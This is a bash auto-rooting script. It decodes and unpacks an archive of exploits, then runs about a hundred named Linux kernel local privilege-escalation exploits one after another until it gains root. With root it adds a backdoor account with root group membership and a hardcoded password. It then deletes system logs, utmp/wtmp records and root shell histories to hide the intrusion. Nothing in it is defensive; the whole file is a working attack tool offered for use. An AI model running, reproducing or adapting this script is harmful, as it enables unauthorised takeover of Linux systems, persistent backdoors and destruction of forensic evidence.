#!/bin/bash

fcheck
()
{
	if [ $(whoami) = 'root' ] 2> /dev/null
then
		echo " [*] Got root!"
		GOTROOT=1
	fi
}

if [ -f exploits.base64 ] 2> /dev/null
then
	if [ ! -f exploits.tar.gz ] 2> /dev/null
	then
		cat exploits.base64 | base64 -d > exploits.tar.gz
		rm exploits.base64 
	fi
fi

GOTROOT=''

tar -xf exploits.tar.gz
rm exploits.tar.gz
cd exploits
chmod 777 *

if [ $GOTROOT -z ] 2> /dev/null
then
	./1-2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./1-3
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./1-4
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-374.12.1.el5-2012
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./10
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./11
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./12
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./14
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./15.sh
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./15150
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./15200
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./16
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./16-1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./18
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./18-5
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-32-46-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-37
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2005
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2-6-9-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.4.36.92.6.27.5\ -\ 2008\ Local\ root
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-164-2010
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-194
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-194.1-2010
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-194.2-2010
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-274-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-6-x86-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.2-hoolyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.20
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.20-2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.22
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.22-2008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.22-6-86_64-2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.23-2.6.24
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.23-2.6.24_2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.23-2.6.27
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.24
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.27.7-generi
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.28-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.32-46.1.BHsmp
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.33
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.34-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.34-2011Exploit1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.34-2011Exploit2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.37
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.37-rc2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.5_hoolyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.6-34
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.6-34_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.6_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.7_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.8-2008.9-67-2008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.8-5_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.8_h00lyshit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-2004
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-2008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-34
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-42.0.3.ELsmp
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-42.0.3.ELsmp-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-55
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-55-2007-prv8
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-55-2008-prv8
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9-672008
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.9.2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.91-2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2009-local
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2009-wunderbar
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2011 LocalRoot\ For\ 2.6.18-128.el5
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./21
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./3
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./3.4.6-9-2007
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./31
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./36-rc1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./4
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./44
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./47
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./5
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./50
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./54
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./6
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./67
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./7
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./7-2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./7x
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./8
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./9
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./90
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./94
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./Linux_2.6\(1\).12
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./Linux_2.6.12
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./2.6.18-2011
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./acid
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./d3vil
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exp1
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exp2
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exp3
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./exploit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./full-nelson
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./gayros
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./lenis.sh
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./local-2.6.9-2005-2006
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./local-root-exploit-gayros
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./priv4
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./pwnkernel
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./root.py
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./runx
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./tivoli
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./ubuntu
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./vmsplice-local-root-exploit
	fcheck
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	./z1d-2011
	fcheck
fi

cd ..
rm -rf exploits

if [ $GOTROOT = 1 ] 2> /dev/null
then
	RUSER='somesecguy'
	RPASS='g0tr00t'
	echo '[*] Adding root user..'
	adduser -g 0 $RUSER -G wheel,sys,bin,daemon,adm,disk -d /sf7 -s /bin/sh
	passwd $RPASS
	echo
	echo "[*] Added root user $RUSER with password $RPASS"
	echo "[*] Clearing logs.."
	rm -rf /tmp/logs 2> /dev/null
	rm -rf /root/.ksh_history 2> /dev/null
	rm -rf /root/.bash_history 2> /dev/null
	rm -rf /root/.bash_logout 2> /dev/null
	rm -rf /usr/local/apache/logs 2> /dev/null
	rm -rf /usr/local/apache/log 2> /dev/null
	rm -rf /var/apache/logs 2> /dev/null
	rm -rf /var/apache/log 2> /dev/null
	rm -rf /var/run/utmp 2> /dev/null
	rm -rf /var/logs 2> /dev/null
	rm -rf /var/log 2> /dev/null
	rm -rf /var/adm 2> /dev/null
	rm -rf /etc/wtmp 2> /dev/null
	rm -rf /etc/utmp 2> /dev/null
	GOTROOT=''
	echo "[*] You g0t r00t, horray for you..."
else
	echo "[*] You didn't g0t r00t, sucks to be you..."
fi
